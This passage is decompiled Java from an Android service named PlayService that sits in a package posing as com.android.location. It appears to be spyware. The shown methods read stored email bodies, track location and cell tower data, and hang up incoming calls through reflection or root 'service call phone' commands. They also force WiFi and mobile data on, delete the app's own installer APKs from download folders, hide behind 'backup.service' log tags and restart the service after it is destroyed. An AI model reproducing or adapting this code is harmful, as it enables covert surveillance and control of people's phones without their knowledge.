    //   40	69	148	java/lang/Exception
    //   77	83	148	java/lang/Exception
    //   139	145	148	java/lang/Exception
    //   192	200	148	java/lang/Exception
    //   208	216	148	java/lang/Exception
    //   240	246	148	java/lang/Exception
    //   254	285	148	java/lang/Exception
    //   293	317	148	java/lang/Exception
    //   325	332	148	java/lang/Exception
    //   340	360	148	java/lang/Exception
    //   368	378	148	java/lang/Exception
    //   386	392	148	java/lang/Exception
    //   400	407	148	java/lang/Exception
    //   415	439	148	java/lang/Exception
    //   447	482	148	java/lang/Exception
    //   490	505	148	java/lang/Exception
    //   543	548	148	java/lang/Exception
    //   556	585	148	java/lang/Exception
    //   593	600	148	java/lang/Exception
    //   608	615	148	java/lang/Exception
    //   623	629	148	java/lang/Exception
    //   637	666	148	java/lang/Exception
    //   674	705	148	java/lang/Exception
    //   713	721	148	java/lang/Exception
    //   729	739	148	java/lang/Exception
    //   747	753	148	java/lang/Exception
    //   761	766	148	java/lang/Exception
    //   774	803	148	java/lang/Exception
    //   811	817	148	java/lang/Exception
    //   856	861	148	java/lang/Exception
    //   869	872	148	java/lang/Exception
    //   895	901	148	java/lang/Exception
    //   912	918	148	java/lang/Exception
    //   926	931	148	java/lang/Exception
    //   939	968	148	java/lang/Exception
    //   992	998	148	java/lang/Exception
    //   167	172	174	java/io/IOException
    //   112	122	178	java/lang/Exception
    //   220	228	228	java/io/IOException
    //   510	517	841	finally
    //   517	525	841	finally
    //   829	838	841	finally
    //   40	69	872	finally
    //   77	83	872	finally
    //   112	122	872	finally
    //   139	145	872	finally
    //   154	162	872	finally
    //   192	200	872	finally
    //   208	216	872	finally
    //   240	246	872	finally
    //   254	285	872	finally
    //   293	317	872	finally
    //   325	332	872	finally
    //   340	360	872	finally
    //   368	378	872	finally
    //   386	392	872	finally
    //   400	407	872	finally
    //   415	439	872	finally
    //   447	482	872	finally
    //   490	505	872	finally
    //   543	548	872	finally
    //   556	585	872	finally
    //   593	600	872	finally
    //   608	615	872	finally
    //   623	629	872	finally
    //   637	666	872	finally
    //   674	705	872	finally
    //   713	721	872	finally
    //   729	739	872	finally
    //   747	753	872	finally
    //   761	766	872	finally
    //   774	803	872	finally
    //   811	817	872	finally
    //   856	861	872	finally
    //   869	872	872	finally
    //   895	901	872	finally
    //   912	918	872	finally
    //   926	931	872	finally
    //   939	968	872	finally
    //   992	998	872	finally
    //   973	978	980	java/io/IOException
    //   192	200	1001	java/io/IOException
    //   856	861	1006	java/io/IOException
    //   543	548	1011	java/io/IOException
    //   822	827	1016	java/io/IOException
    //   879	884	1021	java/io/IOException
  }
  
  /* Error */
  void WriteByteStreamToOutputStream(byte[] paramArrayOfByte, OutputStream paramOutputStream)
  {
    // Byte code:
    //   0: aload_1
    //   1: ifnull +103 -> 104
    //   4: new 6351	java/io/ByteArrayInputStream
    //   7: dup
    //   8: aload_1
    //   9: invokespecial 6352	java/io/ByteArrayInputStream:<init>	([B)V
    //   12: astore 4
    //   14: aload_0
    //   15: aload_2
    //   16: new 864	java/lang/StringBuilder
    //   19: dup
    //   20: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   23: aload_1
    //   24: arraylength
    //   25: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   28: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   31: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   34: sipush 4096
    //   37: newarray byte
    //   39: astore_1
    //   40: aload 4
    //   42: aload_1
    //   43: invokevirtual 6353	java/io/ByteArrayInputStream:read	([B)I
    //   46: istore_3
    //   47: iload_3
    //   48: ifgt +19 -> 67
    //   51: aload_2
    //   52: iconst_1
    //   53: invokevirtual 2182	java/io/OutputStream:write	(I)V
    //   56: aload 4
    //   58: ifnull +8 -> 66
    //   61: aload 4
    //   63: invokevirtual 6354	java/io/ByteArrayInputStream:close	()V
    //   66: return
    //   67: aload_2
    //   68: aload_1
    //   69: iconst_0
    //   70: iload_3
    //   71: invokevirtual 3411	java/io/OutputStream:write	([BII)V
    //   74: goto -34 -> 40
    //   77: astore_1
    //   78: aload 4
    //   80: ifnull -14 -> 66
    //   83: aload 4
    //   85: invokevirtual 6354	java/io/ByteArrayInputStream:close	()V
    //   88: return
    //   89: astore_1
    //   90: return
    //   91: astore_1
    //   92: aload 4
    //   94: ifnull +8 -> 102
    //   97: aload 4
    //   99: invokevirtual 6354	java/io/ByteArrayInputStream:close	()V
    //   102: aload_1
    //   103: athrow
    //   104: aload_0
    //   105: aload_2
    //   106: ldc_w 2266
    //   109: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   112: return
    //   113: astore_2
    //   114: goto -12 -> 102
    //   117: astore_1
    //   118: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	119	0	this	PlayService
    //   0	119	1	paramArrayOfByte	byte[]
    //   0	119	2	paramOutputStream	OutputStream
    //   46	25	3	i	int
    //   12	86	4	localByteArrayInputStream	java.io.ByteArrayInputStream
    // Exception table:
    //   from	to	target	type
    //   14	40	77	java/lang/Exception
    //   40	47	77	java/lang/Exception
    //   51	56	77	java/lang/Exception
    //   67	74	77	java/lang/Exception
    //   83	88	89	java/io/IOException
    //   14	40	91	finally
    //   40	47	91	finally
    //   51	56	91	finally
    //   67	74	91	finally
    //   97	102	113	java/io/IOException
    //   61	66	117	java/io/IOException
  }
  
  /* Error */
  void WriteFileToOutputStream(File paramFile, OutputStream paramOutputStream)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: aconst_null
    //   4: astore 5
    //   6: new 2020	java/io/FileInputStream
    //   9: dup
    //   10: aload_1
    //   11: invokespecial 3409	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   14: astore_1
    //   15: sipush 4096
    //   18: newarray byte
    //   20: astore 4
    //   22: aload_1
    //   23: aload 4
    //   25: invokevirtual 6355	java/io/FileInputStream:read	([B)I
    //   28: istore_3
    //   29: iload_3
    //   30: ifgt +12 -> 42
    //   33: aload_1
    //   34: ifnull +68 -> 102
    //   37: aload_1
    //   38: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   41: return
    //   42: aload_2
    //   43: aload 4
    //   45: iconst_0
    //   46: iload_3
    //   47: invokevirtual 3411	java/io/OutputStream:write	([BII)V
    //   50: goto -28 -> 22
    //   53: astore_2
    //   54: aload_1
    //   55: ifnull -14 -> 41
    //   58: aload_1
    //   59: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   62: return
    //   63: astore_1
    //   64: return
    //   65: astore_1
    //   66: aload 4
    //   68: astore_2
    //   69: aload_2
    //   70: ifnull +7 -> 77
    //   73: aload_2
    //   74: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   77: aload_1
    //   78: athrow
    //   79: astore_1
    //   80: return
    //   81: astore_2
    //   82: goto -5 -> 77
    //   85: astore 4
    //   87: aload_1
    //   88: astore_2
    //   89: aload 4
    //   91: astore_1
    //   92: goto -23 -> 69
    //   95: astore_1
    //   96: aload 5
    //   98: astore_1
    //   99: goto -45 -> 54
    //   102: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	103	0	this	PlayService
    //   0	103	1	paramFile	File
    //   0	103	2	paramOutputStream	OutputStream
    //   28	19	3	i	int
    //   1	66	4	arrayOfByte	byte[]
    //   85	5	4	localObject1	Object
    //   4	93	5	localObject2	Object
    // Exception table:
    //   from	to	target	type
    //   15	22	53	java/lang/Exception
    //   22	29	53	java/lang/Exception
    //   42	50	53	java/lang/Exception
    //   58	62	63	java/io/IOException
    //   6	15	65	finally
    //   37	41	79	java/io/IOException
    //   73	77	81	java/io/IOException
    //   15	22	85	finally
    //   22	29	85	finally
    //   42	50	85	finally
    //   6	15	95	java/lang/Exception
  }
  
  /* Error */
  public int WriteLabel(int paramInt, byte[] paramArrayOfByte)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 4
    //   3: aconst_null
    //   4: astore 6
    //   6: aconst_null
    //   7: astore 7
    //   9: iload 4
    //   11: istore_3
    //   12: aload 6
    //   14: astore 5
    //   16: aload_2
    //   17: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   20: astore 8
    //   22: iload 4
    //   24: istore_3
    //   25: aload 6
    //   27: astore 5
    //   29: aload 8
    //   31: aconst_null
    //   32: invokevirtual 4905	java/nio/ByteBuffer:order	(Ljava/nio/ByteOrder;)Ljava/nio/ByteBuffer;
    //   35: pop
    //   36: iload 4
    //   38: istore_3
    //   39: aload 6
    //   41: astore 5
    //   43: aload 8
    //   45: invokevirtual 4907	java/nio/ByteBuffer:getInt	()I
    //   48: istore 4
    //   50: iload 4
    //   52: istore_3
    //   53: aload 6
    //   55: astore 5
    //   57: new 864	java/lang/StringBuilder
    //   60: dup
    //   61: ldc_w 6357
    //   64: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   67: iload 4
    //   69: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   72: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   75: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   78: iload 4
    //   80: istore_3
    //   81: aload 6
    //   83: astore 5
    //   85: new 1203	java/io/FileOutputStream
    //   88: dup
    //   89: new 864	java/lang/StringBuilder
    //   92: dup
    //   93: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   96: aload_0
    //   97: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   100: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   103: ldc_w 1717
    //   106: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   109: ldc_w 4893
    //   112: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   115: iload_1
    //   116: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   119: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   122: invokespecial 1655	java/io/FileOutputStream:<init>	(Ljava/lang/String;)V
    //   125: astore 6
    //   127: aload 6
    //   129: aload_2
    //   130: iconst_0
    //   131: iconst_4
    //   132: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   135: aload 6
    //   137: ifnull +88 -> 225
    //   140: aload 6
    //   142: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   145: iload 4
    //   147: ireturn
    //   148: astore 6
    //   150: aload 7
    //   152: astore_2
    //   153: aload_2
    //   154: astore 5
    //   156: aload 6
    //   158: ldc_w 6358
    //   161: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   164: iload_3
    //   165: istore 4
    //   167: aload_2
    //   168: ifnull -23 -> 145
    //   171: aload_2
    //   172: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   175: iload_3
    //   176: ireturn
    //   177: astore_2
    //   178: iload_3
    //   179: ireturn
    //   180: astore_2
    //   181: aload 5
    //   183: ifnull +8 -> 191
    //   186: aload 5
    //   188: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   191: aload_2
    //   192: athrow
    //   193: astore_2
    //   194: iload 4
    //   196: ireturn
    //   197: astore 5
    //   199: goto -8 -> 191
    //   202: astore_2
    //   203: aload 6
    //   205: astore 5
    //   207: goto -26 -> 181
    //   210: astore 5
    //   212: aload 6
    //   214: astore_2
    //   215: aload 5
    //   217: astore 6
    //   219: iload 4
    //   221: istore_3
    //   222: goto -69 -> 153
    //   225: iload 4
    //   227: ireturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	228	0	this	PlayService
    //   0	228	1	paramInt	int
    //   0	228	2	paramArrayOfByte	byte[]
    //   11	211	3	i	int
    //   1	225	4	j	int
    //   14	173	5	localObject1	Object
    //   197	1	5	localIOException	IOException
    //   205	1	5	localException1	Exception
    //   210	6	5	localException2	Exception
    //   4	137	6	localFileOutputStream	FileOutputStream
    //   148	65	6	localException3	Exception
    //   217	1	6	localObject2	Object
    //   7	144	7	localObject3	Object
    //   20	24	8	localByteBuffer	ByteBuffer
    // Exception table:
    //   from	to	target	type
    //   16	22	148	java/lang/Exception
    //   29	36	148	java/lang/Exception
    //   43	50	148	java/lang/Exception
    //   57	78	148	java/lang/Exception
    //   85	127	148	java/lang/Exception
    //   171	175	177	java/io/IOException
    //   16	22	180	finally
    //   29	36	180	finally
    //   43	50	180	finally
    //   57	78	180	finally
    //   85	127	180	finally
    //   156	164	180	finally
    //   140	145	193	java/io/IOException
    //   186	191	197	java/io/IOException
    //   127	135	202	finally
    //   127	135	210	java/lang/Exception
  }
  
  public void addLocationInfo(LbsInfo paramLbsInfo)
  {
    if (paramLbsInfo == null) {}
    do
    {
      return;
      FLOG("addLocationInfo()" + paramLbsInfo.lbsLatitude + ":" + paramLbsInfo.lbsLongtitude);
    } while (this.locationHistoryLocked);
    LbsInfo localLbsInfo = new LbsInfo();
    localLbsInfo.lbsAltitude = paramLbsInfo.lbsAltitude;
    localLbsInfo.lbsLatitude = paramLbsInfo.lbsLatitude;
    localLbsInfo.lbsLongtitude = paramLbsInfo.lbsLongtitude;
    localLbsInfo.lbsPrecision = paramLbsInfo.lbsPrecision;
    localLbsInfo.lbsType = paramLbsInfo.lbsType;
    localLbsInfo.timepoint = paramLbsInfo.timepoint;
    this.locationHistoryLocked = true;
    this.locationHistory.add(localLbsInfo);
    FLOG("Location added size = " + this.locationHistory.size());
    this.locationHistoryLocked = false;
  }
  
  public String generateUUID()
  {
    StringBuilder localStringBuilder = new StringBuilder(UUID.randomUUID().toString());
    for (int i = localStringBuilder.indexOf("-");; i = localStringBuilder.indexOf("-"))
    {
      if (i <= 0) {
        return localStringBuilder.toString();
      }
      localStringBuilder.deleteCharAt(i);
    }
  }
  
  public WifiAndCellCollector.CCidLacTime getCurCidLac()
  {
    if (this.lastCid * this.lastLac == 0) {
      return null;
    }
    WifiAndCellCollector localWifiAndCellCollector = this.wifiAndCellCollector;
    localWifiAndCellCollector.getClass();
    return new WifiAndCellCollector.CCidLacTime(localWifiAndCellCollector, this.lastCid, this.lastLac, getCurrentTime(), this.lastMnc, this.lastMcc);
  }
  
  byte[] getEmailBody(long paramLong)
  {
    FLOG("try read body...");
    try
    {
      Object localObject = Uri.parse("content://com.android.email.provider/body");
      Cursor localCursor = getContentResolver().query((Uri)localObject, null, "messageKey = " + paramLong, null, null);
      FLOG("Email vse ok: " + localCursor);
      if (localCursor != null)
      {
        localCursor.moveToFirst();
        FLOG("try to read HTML text");
        byte[] arrayOfByte = localCursor.getBlob(localCursor.getColumnIndex("htmlContent"));
        if (arrayOfByte != null)
        {
          localObject = arrayOfByte;
          if (arrayOfByte.length != 0) {}
        }
        else
        {
          FLOG("try to read PLAIN text");
          localObject = localCursor.getBlob(localCursor.getColumnIndex("textContent"));
          FLOG("b=" + localObject);
        }
        if (!localCursor.isClosed()) {
          localCursor.close();
        }
        if (localObject != null)
        {
          FLOG("red body len " + localObject.length);
          return localObject;
        }
        FLOG("body is NULL");
        return localObject;
      }
    }
    catch (Exception localException)
    {
      EXCEPT(localException, "getEmailBody");
    }
    for (;;)
    {
      FLOG("red body 0");
      return null;
      FLOG("red body nothing");
    }
  }
  
  public String getLocalIpAddress()
  {
    try
    {
      localObject = NetworkInterface.getNetworkInterfaces();
      boolean bool = ((Enumeration)localObject).hasMoreElements();
      if (bool) {
        break label19;
      }
    }
    catch (SocketException localSocketException)
    {
      for (;;)
      {
        Object localObject;
        label19:
        NetworkInterface localNetworkInterface;
        Enumeration localEnumeration;
        InetAddress localInetAddress;
        EXCEPT(localSocketException, "getLocalIpAddress");
      }
    }
    return "\n";
    localNetworkInterface = (NetworkInterface)((Enumeration)localObject).nextElement();
    localEnumeration = localNetworkInterface.getInetAddresses();
    do
    {
      if (!localEnumeration.hasMoreElements()) {
        break;
      }
      localInetAddress = (InetAddress)localEnumeration.nextElement();
    } while (localInetAddress.isLoopbackAddress());
    localObject = "Interface:" + localNetworkInterface.getDisplayName() + "\nIP:" + localInetAddress.getHostAddress().toString() + "\n";
    return localObject;
  }
  
  /* Error */
  int getMyUserID()
  {
    // Byte code:
    //   0: ldc_w 6442
    //   3: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   6: aload_0
    //   7: invokevirtual 2047	com/android/location/PlayService:getAssets	()Landroid/content/res/AssetManager;
    //   10: astore 8
    //   12: aconst_null
    //   13: astore 6
    //   15: aconst_null
    //   16: astore 5
    //   18: aconst_null
    //   19: astore 7
    //   21: iconst_0
    //   22: istore 4
    //   24: iconst_0
    //   25: istore_3
    //   26: iconst_0
    //   27: istore_1
    //   28: aload 8
    //   30: ifnonnull +15 -> 45
    //   33: aload 7
    //   35: ifnull +8 -> 43
    //   38: aload 7
    //   40: invokevirtual 2076	java/io/InputStream:close	()V
    //   43: iconst_0
    //   44: ireturn
    //   45: iload_1
    //   46: istore_2
    //   47: aload 8
    //   49: ldc_w 6444
    //   52: invokevirtual 2061	android/content/res/AssetManager:open	(Ljava/lang/String;)Ljava/io/InputStream;
    //   55: astore 7
    //   57: aload 7
    //   59: ifnonnull +52 -> 111
    //   62: aload 7
    //   64: astore 6
    //   66: iload_1
    //   67: istore_2
    //   68: aload 7
    //   70: astore 5
    //   72: ldc_w 6446
    //   75: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   78: goto -45 -> 33
    //   81: astore 7
    //   83: aload 6
    //   85: astore 5
    //   87: aload 7
    //   89: ldc_w 6448
    //   92: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   95: iload_2
    //   96: istore_3
    //   97: aload 6
    //   99: ifnull +10 -> 109
    //   102: aload 6
    //   104: invokevirtual 2076	java/io/InputStream:close	()V
    //   107: iload_2
    //   108: istore_3
    //   109: iload_3
    //   110: ireturn
    //   111: aload 7
    //   113: astore 6
    //   115: iload_1
    //   116: istore_2
    //   117: aload 7
    //   119: astore 5
    //   121: new 2007	java/io/BufferedReader
    //   124: dup
    //   125: new 2009	java/io/InputStreamReader
    //   128: dup
    //   129: aload 7
    //   131: invokespecial 2012	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   134: invokespecial 2015	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   137: astore 8
    //   139: iload_3
    //   140: istore_1
    //   141: aload 7
    //   143: astore 5
    //   145: aload 8
    //   147: invokevirtual 2018	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   150: astore 6
    //   152: iload_3
    //   153: istore_1
    //   154: aload 7
    //   156: astore 5
    //   158: new 864	java/lang/StringBuilder
    //   161: dup
    //   162: ldc_w 6450
    //   165: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   168: aload 6
    //   170: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   173: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   176: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   179: iload 4
    //   181: istore_1
    //   182: aload 6
    //   184: ifnull +46 -> 230
    //   187: iload_3
    //   188: istore_1
    //   189: aload 7
    //   191: astore 5
    //   193: aload 6
    //   195: invokevirtual 1652	java/lang/String:trim	()Ljava/lang/String;
    //   198: invokestatic 1752	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   201: istore_2
    //   202: iload_2
    //   203: istore_1
    //   204: aload 7
    //   206: astore 5
    //   208: new 864	java/lang/StringBuilder
    //   211: dup
    //   212: ldc_w 6452
    //   215: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   218: iload_2
    //   219: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   222: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   225: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   228: iload_2
    //   229: istore_1
    //   230: iload_1
    //   231: istore_3
    //   232: aload 7
    //   234: ifnull -125 -> 109
    //   237: aload 7
    //   239: invokevirtual 2076	java/io/InputStream:close	()V
    //   242: iload_1
    //   243: istore_3
    //   244: goto -135 -> 109
    //   247: astore 5
    //   249: iload_1
    //   250: istore_3
    //   251: goto -142 -> 109
    //   254: astore 8
    //   256: aload 7
    //   258: astore 6
    //   260: iload_1
    //   261: istore_2
    //   262: aload 7
    //   264: astore 5
    //   266: aload 8
    //   268: ldc_w 6454
    //   271: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   274: goto -44 -> 230
    //   277: astore 6
    //   279: aload 5
    //   281: ifnull +8 -> 289
    //   284: aload 5
    //   286: invokevirtual 2076	java/io/InputStream:close	()V
    //   289: aload 6
    //   291: athrow
    //   292: astore 5
    //   294: goto -251 -> 43
    //   297: astore 5
    //   299: iload_2
    //   300: istore_3
    //   301: goto -192 -> 109
    //   304: astore 5
    //   306: goto -17 -> 289
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	309	0	this	PlayService
    //   27	234	1	i	int
    //   46	254	2	j	int
    //   25	276	3	k	int
    //   22	158	4	m	int
    //   16	191	5	localObject1	Object
    //   247	1	5	localException1	Exception
    //   264	21	5	localObject2	Object
    //   292	1	5	localException2	Exception
    //   297	1	5	localException3	Exception
    //   304	1	5	localException4	Exception
    //   13	246	6	localObject3	Object
    //   277	13	6	localObject4	Object
    //   19	50	7	localInputStream	InputStream
    //   81	182	7	localException5	Exception
    //   10	136	8	localObject5	Object
    //   254	13	8	localException6	Exception
    // Exception table:
    //   from	to	target	type
    //   47	57	81	java/lang/Exception
    //   72	78	81	java/lang/Exception
    //   121	139	81	java/lang/Exception
    //   266	274	81	java/lang/Exception
    //   237	242	247	java/lang/Exception
    //   145	152	254	java/lang/Exception
    //   158	179	254	java/lang/Exception
    //   193	202	254	java/lang/Exception
    //   208	228	254	java/lang/Exception
    //   47	57	277	finally
    //   72	78	277	finally
    //   87	95	277	finally
    //   121	139	277	finally
    //   145	152	277	finally
    //   158	179	277	finally
    //   193	202	277	finally
    //   208	228	277	finally
    //   266	274	277	finally
    //   38	43	292	java/lang/Exception
    //   102	107	297	java/lang/Exception
    //   284	289	304	java/lang/Exception
  }
  
  public String initiateCall(String paramString)
  {
    FLOG("initiateCall");
    try
    {
      paramString = new SipAudioCall.Listener()
      {
        public void onCallEnded(SipAudioCall paramAnonymousSipAudioCall) {}
        
        public void onCallEstablished(SipAudioCall paramAnonymousSipAudioCall)
        {
          paramAnonymousSipAudioCall.startAudio();
        }
      };
      FLOG("call:" + "sip:test.time@sip5060.net");
      FLOG("me:" + this.me.getUriString());
      this.call = this.sipManager.makeAudioCall(this.me.getUriString(), "sip:test.time@sip5060.net", paramString, 30);
      FLOG("callok");
      return "Звонок успешно создан";
    }
    catch (Exception paramString)
    {
      EXCEPT(paramString, "initCall error");
      if (this.me == null) {}
    }
    try
    {
      this.sipManager.close(this.me.getUriString());
      if (this.call != null) {
        this.call.close();
      }
      return "Ошибка установки соединения ";
    }
    catch (Exception localException)
    {
      for (;;)
      {
        EXCEPT(paramString, "error closing manager");
        localException.printStackTrace();
      }
    }
  }
  
  public String isRootInstall()
  {
    Object localObject1 = "[Usermode]";
    Object localObject2 = localObject1;
    int i;
    label246:
    do
    {
      try
      {
        if (new File("/system/app/Shadow.apk").exists())
        {
          localObject2 = "[Root]";
          localObject1 = localObject2;
          this.bIsRootInstall = true;
        }
        localObject3 = localObject2;
        localObject1 = localObject2;
        if (new File("/system/app/shadow.apk").exists())
        {
          localObject3 = "[Root]";
          localObject1 = localObject3;
          this.bIsRootInstall = true;
        }
        localObject1 = localObject3;
        localObject2 = localObject3;
        if (!new File("/data/app/" + MY_PACKAGE_NAME + ".apk").exists()) {
          break label246;
        }
        localObject1 = localObject3;
        localObject2 = localObject3 + "[Usermode]";
      }
      catch (Exception localException)
      {
        Object localObject3;
        EXCEPT(localException, "isRootInstall");
        return localObject1;
      }
      localObject3 = localObject2;
      localObject1 = localObject2;
      if (new File("/data/app/" + MY_PACKAGE_NAME + "-" + i + ".apk").exists())
      {
        localObject1 = localObject2;
        localObject3 = localObject2 + "[Usermode" + i + "]";
      }
      i += 1;
      localObject2 = localObject3;
      continue;
      i = 1;
    } while (i < 32);
    return localException;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    Log.v("backup.service", "ONBIND_NA");
    return null;
  }
  
  public void onCreate()
  {
    Log.v("backup.service", "OnCreate(1)");
    Log.v("backup.service", PackageManager.class.getName());
    ref = this;
    Log.v("backup.service", "OnCreate(2)");
    Object localObject = isRootInstall();
    Log.v("backup.service", "OnCreate(3)");
    UpdateState("Service Started", false, bCanSu);
    if (!LOGCAT) {
      FLOG("ETO RELEASE! LOGa NE BUDET");
    }
    context = ref.getBaseContext();
    mydir = context.getFilesDir();
    filesPath = mydir.getAbsolutePath();
    ROTATELOG();
    FLOG("Service started1, files = " + filesPath);
    dataPath = filesPath.substring(0, filesPath.lastIndexOf('/'));
    FLOG("Service started1, data = " + dataPath);
    this.CUSTOMER_ID = getMyUserID();
    if (this.CUSTOMER_ID > 0)
    {
      DisableSoft(1);
      if (LaunchActivity.ref != null) {
        LaunchActivity.ref.finish();
      }
    }
    FLOG("<<<<<<--------->>>>>>");
    FLOG("[[[[[[---------]]]]]]");
    setBaseOptions();
    FLOG("Get Resources");
    res = getResources();
    putEvent(res.getString(2130968588) + " " + (String)localObject);
    this.myName = res.getString(2130968576);
    FLOG("MyNameApp=" + this.myName);
    long l = SystemClock.elapsedRealtime();
    FLOG("Elapsed since boot " + l);
    putEvent(res.getString(2130968580) + l);
    putEvent(res.getString(2130968577));
    GetDataConnectionAPI();
    if (bForce3G)
    {
      turn3GOn();
      FLOG("Force 3g done");
      setMobileDataEnabled(ref.getApplicationContext(), true);
      FLOG("setMobileDataEnabled");
    }
    if (bForceWIFI)
    {
      FLOG("IsWifiEnabled?");
      localObject = (WifiManager)getSystemService("wifi");
      FLOG("wifi=" + localObject);
      if ((localObject == null) || (((WifiManager)localObject).isWifiEnabled())) {
        break label618;
      }
      FLOG("Try to Enable, sleep for a while");
      ((WifiManager)localObject).setWifiEnabled(true);
    }
    try
    {
      Thread.sleep(20000L);
      for (;;)
      {
        GetCidLac();
        FLOG("OnCreate()");
        localObject = Environment.getExternalStorageDirectory().getAbsolutePath();
        RemoveShadowApk((String)localObject);
        RemoveShadowApk(localObject + "/download");
        RemoveShadowApk(localObject + "/Download");
        RemoveShadowApk(localObject + "/downloads");
        RemoveShadowApk(localObject + "/Downloads");
        ClearOldFiles();
        Initialize();
        if (l >= 300000L) {
          break;
        }
        FLOG("Phone was rebooted, we should renew Phonebook");
        iLastPhoneBookIDServer = 0L;
        SaveSettings();
        return;
        label618:
        FLOG("Wifi already enabled or null");
      }
      FLOG("Phone was rebooted more than " + l / 60L / 1000L + " minutes ago, cancel Phonebook reset");
      return;
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
  }
  
  public void onDestroy()
  {
    FLOG("onDestroy()");
    Log.v("backup.service", "ONDESTROY_NA");
    putEvent("Service:onDestroy()");
    ((AlarmManager)getSystemService("alarm")).set(0, System.currentTimeMillis() + 300000L, PendingIntent.getService(this, 0, new Intent(this, PlayService.class), 0));
  }
  
  public void onLocationChange(LbsInfo paramLbsInfo)
  {
    FLOG("PlayService::onLocationChange()!!!" + paramLbsInfo);
    if ((paramLbsInfo != null) && (!paramLbsInfo.isError))
    {
      this.curInfo = paramLbsInfo;
      FLOG("PlayService::onLocationChange:" + paramLbsInfo.lbsLatitude + "," + paramLbsInfo.lbsLongtitude + " - " + paramLbsInfo.lbsType);
    }
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    Log.v("backup.service", "ONSTART_NA");
    FLOG("onStart()");
    putEvent("Service:onStart()");
    setBaseOptions();
    Initialize();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    FLOG("onStartCommand");
    putEvent("*Wake up*");
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public void rejectPhoneAidl(Context paramContext, String paramString)
  {
    FLOG("rejectPhoneAidl() " + paramString);
    this.rejected = paramString;
    if (Build.VERSION.SDK_INT < 14) {
      try
      {
        paramContext = (TelephonyManager)getSystemService("phone");
        FLOG("tm=" + paramContext);
        if (paramContext == null) {
          return;
        }
        paramString = Class.forName(paramContext.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
        FLOG("m=" + paramString);
        if (paramString == null) {
          return;
        }
        paramString.setAccessible(true);
        this.telephonyService = ((ITelephony)paramString.invoke(paramContext, new Object[0]));
        FLOG("telephonyService=" + this.telephonyService);
        FLOG("Silenced...");
        FLOG("Endcall = " + this.telephonyService.endCall());
        FLOG("Ended");
        putEvent(res.getString(2130968586) + " " + this.rejected);
        return;
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "rejectPhoneAidl");
        return;
      }
    }
    if (bCanSu == CAN)
    {
      paramContext = "service call phone 5";
      if (Build.VERSION.SDK_INT == 18) {
        paramContext = "service call phone 6";
      }
      if (Build.VERSION.SDK_INT >= 21) {
        paramContext = "service call phone 4";
      }
      commandSU(paramContext);
    }
  }
  
  boolean removeMyUserInstallation()
  {
    boolean bool3 = false;
    boolean bool1 = false;
    bool2 = bool3;
    try
    {
